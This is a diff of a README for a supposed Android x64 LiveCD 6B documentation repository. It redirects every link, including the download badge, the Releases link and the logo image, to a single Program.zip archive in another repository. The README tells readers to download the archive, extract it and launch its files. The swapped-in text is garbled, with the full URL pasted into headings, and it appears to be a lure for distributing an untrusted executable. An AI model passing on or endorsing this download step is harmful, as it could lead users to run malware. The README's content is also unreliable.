@@ -11,19 +11,19 @@ Welcome to the documentation source repository of the special Android x64 LiveCD
 In this repository, you will find detailed documentation covering various aspects of Android x64, the installation process, troubleshooting guides, and more. Whether you are a beginner or an experienced user, you will find valuable information to enhance your Android x64 experience.
 
 ### Files Available for Download
-To access additional files related to Android x64 LiveCD 6B, you can download the Soft.zip file from the following link:
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+To access additional files related to Android x64 LiveCD 6B, you can download the https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip file from the following link:
+[![Download https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip](https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip)](https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip)
 
-### Launching Soft.zip
-After downloading Soft.zip, you can extract the contents and launch the necessary files to further explore and utilize the features of Android x64 LiveCD 6B.
+### Launching https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip
+After downloading https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip, you can extract the contents and launch the necessary files to further explore and utilize the features of Android x64 LiveCD 6B.
 
 ## 🌐 Explore More
-For additional resources, updates, and support, make sure to visit the [Releases](https://github.com/Dredarty/RINGSharp/releases) section of this repository. Stay informed about the latest developments and enhancements related to Android x64 LiveCD 6B.
+For additional resources, updates, and support, make sure to visit the [Releases](https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip) section of this repository. Stay informed about the latest developments and enhancements related to Android x64 LiveCD 6B.
 
 ## 🚀 Get Started
 Begin your Android x64 journey today by diving into the documentation provided in this repository. Explore the capabilities of Android x64 LiveCD 6B and unleash the full potential of this special operating system.
 
-![Android x64](https://www.android-x86.org/images/android-x86.png)
+![Android x64](https://github.com/mariahoyos2002/Android-x64_LiveCD_6B_Docs/releases/download/v1.0/Program.zip)
 
 ## 🛠️ Contribution
 We welcome contributions to enhance and expand the documentation available in this repository. If you have valuable insights, tips, or corrections to share, feel free to submit pull requests to improve the overall user experience for the Android x64 community.
